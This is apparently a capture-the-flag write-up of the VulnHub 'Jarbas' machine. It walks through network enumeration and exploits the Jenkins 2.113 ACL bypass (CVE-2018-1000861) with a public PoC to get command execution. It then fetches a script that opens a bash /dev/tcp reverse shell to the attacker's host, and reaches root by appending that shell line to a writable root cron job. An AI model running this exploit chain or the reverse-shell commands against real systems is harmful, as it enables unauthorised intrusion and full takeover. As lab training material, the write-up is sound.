# Jarbas: 1

## 1.Get VM IP

```bash
root@kali: arp-scan -I eth1 -l
Interface: eth1, type: EN10MB, MAC: 00:0c:29:3a:bc:b3, IPv4: 192.168.127.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.127.1   00:50:56:c0:00:01       VMware, Inc.
192.168.127.240 00:0c:29:e1:f2:ed       VMware, Inc.
192.168.127.254 00:50:56:e5:26:19       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.055 seconds (124.57 hosts/sec). 3 responded
```

The IP address is `192.168.127.240`

## 2.Enumeration

```bash
root@kali: nmap -sV -sC -p- -v -oN nmap.out 192.168.127.240

Nmap scan report for 192.168.127.240
Host is up (0.00088s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 28:bc:49:3c:6c:43:29:57:3c:b8:85:9a:6d:3c:16:3f (RSA)
|   256 a0:1b:90:2c:da:79:eb:8f:3b:14:de:bb:3f:d2:e7:3f (ECDSA)
|_  256 57:72:08:54:b7:56:ff:c3:e6:16:6f:97:cf:ae:7f:76 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-title: Jarbas - O Seu Mordomo Virtual!
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
3306/tcp open  mysql   MariaDB (unauthorized)
8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
MAC Address: 00:0C:29:E1:F2:ED (VMware)
```

We immediately explore port 80 and 8080, in port 80 there is just a normal website that leads to nothing but

port 8080 serves a jenkins server with a login form. investigating internet to find the version of jenkins, i found

this [guide](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security) which says navigating to `/oops` shows the version

of jenkins so :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/a3345335-5afc-4c3e-9bc3-9549de8f0c8c)
![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/d15f5741-2f13-4c0a-b840-e274631e23b9)

jenkins version is `2.113`, i just searched if there is any exploit for this version and i found this [link](https://github.com/gquere/pwn_jenkins#authenticationacl-bypass-cve-2018-1000861-jenkins-21501)

that says there is a Authentication/ACL bypass if this command returns a valid data :

```bash
curl -k -4 -s https://example.com/securityRealm/user/admin/search/index?q=a
```

i used this command against the target and i got a response :

```bash
root@kali: curl -k -4 -s http://192.168.127.240:8080/securityRealm/user/admin/search/index?q=a

<!DOCTYPE html><html><head resURL="/static/f3ad8932" data-rooturl="" data-resurl="/static/f3ad8932">

<title>Search for 'a' [Jenkins]</title><link rel="stylesheet" href="/static/f3ad8932/css/layout-common.css" type="text/css" /><link rel="stylesheet" href="/static/f3ad8932/css/style.css" type="text/css" /><link rel="stylesheet" href="/static/f3ad8932/css/color.css" type="text/css" /><link rel="stylesheet" href="/static/f3ad8932/css/responsive-grid.css" type="text/css" /><link rel="shortcut icon" href="/static/f3ad8932/favicon.ico" type="image/vnd.microsoft.icon" /><link color="black" rel="mask-icon" href="/images/mask-icon.svg" /><script>var isRunAsTest=false; var rootURL=""; var resURL="/static/f3ad8932";</script><script src="/static/f3ad8932/scripts/prototype.js" type="text/javascript"></script><script src="/static/f3ad8932/scripts/behavior.js" type="text/javascript"></script><script src='/adjuncts/f3ad8932/org/kohsuke/stapler/bind.js' type='text/javascript'></script><script src="/static/f3ad8932/scripts/yui/yahoo/yahoo-min.js"></script><script src="/static/f3ad8932/scripts/yui/dom/dom-min.js"></script><script src="/static/f3ad8932/scripts/yui/event/event-min.js"></script><script src="/static/f3ad8932/scripts/yui/animation/animation-min.js"></script><script src="/static/f3ad8932/scripts/yui/dragdrop/dragdrop-min.js"></script><script src="/static/f3ad8932/scripts/yui/container/container-min.js"></script><script src="/static/f3ad8932/scripts/yui/connection/connection-min.js"></script><script src="/static/f3ad8932/scripts/yui/datasource/datasource-min.js"></script><script src="/static/f3ad8932/scripts/yui/autocomplete/autocomplete-min.js"></script><script src="/static/f3ad8932/scripts/yui/menu/menu-min.js"></script><script src="/static/f3ad8932/scripts/yui/element/element-min.js"></script><script src="/static/f3ad8932/scripts/yui/button/button-min.js"></script><script src="/static/f3ad8932/scripts/yui/storage/storage-min.js"></script><script src="/static/f3ad8932/scripts/hudson-behavior.js" type="text/javascript"></script><script src="/static/f3ad8932/scripts/sortable.js" type="text/javascript"></script><script>crumb.init("Jenkins-Crumb", "8f6180d50a5ba4e2893af9f93c568926");</script><link rel="stylesheet" href="/static/f3ad8932/scripts/yui/container/assets/container.css" type="text/css" /><link rel="stylesheet" href="/static/f3ad8932/scripts/yui/assets/skins/sam/skin.css" type="text/css" /><link rel="stylesheet" href="/static/f3ad8932/scripts/yui/container/assets/skins/sam/container.css" type="text/css" /><link rel="stylesheet" href="/static/f3ad8932/scripts/yui/button/assets/skins/sam/button.css" type="text/css" /><link rel="stylesheet" href="/static/f3ad8932/scripts/yui/menu/assets/skins/sam/menu.css" type="text/css" /><meta name="ROBOTS" content="INDEX,NOFOLLOW" /><meta name="viewport" content="width=device-width, initial-scale=1" /><script src="/static/f3ad8932/jsbundles/page-init.js" type="text/javascript"></script></head><body data-model-type="hudson.search.Search" id="jenkins" class="yui-skin-sam two-column jenkins-2.113" data-version="2.113"><a href="#skip2content" class="skiplink">Skip to content</a><div id="page-head"><div id="header"><div class="logo"><a id="jenkins-home-link" href="/"><img src="/static/f3ad8932/images/headshot.png" alt="title" id="jenkins-head-icon" /><img src="/static/f3ad8932/images/title.png" alt="title" width="139" id="jenkins-name-icon" height="34" /></a></div><div class="login"> <a href="/login?from=%2FsecurityRealm%2Fuser%2Fadmin%2Fsearch%2Findex"><b>log in</b></a></div><div class="searchbox hidden-xs"><form method="get" name="search" action="/securityRealm/user/admin/search/" style="position:relative;" class="no-json"><div id="search-box-minWidth"></div><div id="search-box-sizer"></div><div id="searchform"><input name="q" placeholder="search" id="search-box" class="has-default-text" value="a" /> <a href="https://jenkins.io/redirect/search-box"><img src="/static/f3ad8932/images/16x16/help.png" style="width: 16px; height: 16px; " class="icon-help icon-sm" /></a><div id="search-box-completion"></div><script>createSearchBox("/securityRealm/user/admin/search/");</script></div></form></div></div><div id="breadcrumbBar"><tr id="top-nav"><td id="left-top-nav" colspan="2"><link rel='stylesheet' href='/adjuncts/f3ad8932/lib/layout/breadcrumbs.css' type='text/css' /><script src='/adjuncts/f3ad8932/lib/layout/breadcrumbs.js' type='text/javascript'></script><div class="top-sticker noedge"><div class="top-sticker-inner"><div id="right-top-nav"><div id="right-top-nav"><div class="smallfont"><a href="?auto_refresh=true">ENABLE AUTO REFRESH</a></div></div></div><ul id="breadcrumbs"><li class="item"><a href="/" class="model-link inside">Jenkins</a></li><li href="/" class="children"></li><li class="item"><a href="/securityRealm/" class=" inside">Jenkins’ own user database</a></li><li class="separator"></li><li class="item"><a href="/securityRealm/user/admin/" class="model-link inside">admin</a></li><li class="separator"></li></ul><div id="breadcrumb-menu-target"></div></div></div></td></tr></div></div><div id="page-body" class="clear"><div id="side-panel"></div><div id="main-panel"><a name="skip2content"></a><h1>Search for 'a'</h1><ol><li id="item_admin"><a href="?q=admin">admin</a></li><li id="item_master"><a href="?q=master">master</a></li></ol></div></div><footer><div class="container-fluid"><div class="row"><div class="col-md-6" id="footer"></div><div class="col-md-18"><span class="page_generated">Page generated: Nov 8, 2023 9:19:37 AM BRST</span><span class="jenkins_ver"><a href="https://jenkins.io/">Jenkins ver. 2.113</a></span></div></div></div></footer></body></html>
```

so now i'm pretty sure that this version of jenkins is vulnerable, so again i searched to find any exploit for this vulnerability (CVE-2018-1000861)

and i found [this](https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2018-1000861/poc.py) exploit on github which is just a PoC, but i used it in a creative way.

just downloaded the python file and run it against the target :

```bash
root@kali: python2 poc.py http://192.168.127.240:8080/ 'whoami'                
[*] ANONYMOUS_READ disable!
[*] Bypass with CVE-2018-1000861!
[*] Exploit success!(it should be :P)
```

with this output i'm now 100% sure that i can get a shell but this script returns no command output but it realy executes the command on the server.

## 3.Gaining Shell

So i created a reverse shell on my kali machine and served it with python web server :

```bash
root@kali: cat shell.sh                                                                       
#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/192.168.127.128/4444 <&1'

root@kali: python3 -m http.server 80                           
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

and then used the `poc.py` file to download the shell.sh on the victim :

```bash
root@kali: python2 poc.py http://192.168.127.240:8080/ 'wget http://192.168.127.128/shell.sh -P /dev/shm'
[*] ANONYMOUS_READ disable!
[*] Bypass with CVE-2018-1000861!
[*] Exploit success!(it should be :P)
```

and then start a listener on your system and call the shell.sh file on the victim :

```bash
root@kali: python2 poc.py http://192.168.127.240:8080/ 'bash /dev/shm/shell.sh'
[*] ANONYMOUS_READ disable!
[*] Bypass with CVE-2018-1000861!
[*] Exploit success!(it should be :P)
```

and on my machine :

```bash
nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.127.128] from (UNKNOWN) [192.168.127.240] 53568
bash: no job control in this shell
bash-4.2$ id
id
uid=997(jenkins) gid=995(jenkins) groups=995(jenkins) context=system_u:system_r:initrc_t:s0
```

yes we got the shell.

## 4.Privilege Escalation

Check crontab file :

```bash
bash-4.2$ cat /etc/crontab

SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
*/5 * * * * root /etc/script/CleaningScript.sh >/dev/null 2>&1
```

the file `CleaningScript.sh` is writable by user `jenkins` so just add the following line to the file :

```bash
bash -c 'exec bash -i &>/dev/tcp/192.168.127.128/4444 <&1'
```

content of the file :

```bash
bash-4.2$ cat /etc/script/CleaningScript.sh
#!/bin/bash

rm -rf /var/log/httpd/access_log.txt
bash -c 'exec bash -i &>/dev/tcp/192.168.127.128/4444 <&1'
```

and wait for the shell after 5 minutes :

```bash
root@kali: nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.127.128] from (UNKNOWN) [192.168.127.240] 53572
bash: no job control in this shell

[root@jarbas ~]# id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:system_cronjob_t:s0-s0:c0.c1023

[root@jarbas ~]# ls
flag.txt

[root@jarbas ~]# cat flag.txt
Hey!

Congratulations! You got it! I always knew you could do it!
This challenge was very easy, huh? =)

Thanks for appreciating this machine.

@tiagotvrs 
```

this is how you can get root on this machine.

there is also another way, to find the user hashes in /access.html file on port 80 and then use metasploit to get the shell :)












